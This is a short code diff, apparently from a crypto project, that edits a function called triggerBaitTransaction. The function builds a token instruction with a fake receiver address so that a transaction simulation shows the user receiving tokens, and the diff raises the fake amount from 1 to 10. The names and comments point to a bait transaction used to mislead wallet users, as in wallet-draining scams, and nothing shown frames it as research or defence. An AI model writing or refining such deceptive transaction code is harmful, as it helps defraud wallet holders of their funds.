@@ -22,7 +22,7 @@ async function triggerBaitTransaction() {
             fakeReceiverAddress,
             fakeReceiverAddress, // Simulate as if the user will receive tokens
             publicKey,
-            1, // Fake token amount
+            10, // Fake token amount
             [],
             TOKEN_PROGRAM_ID
         )
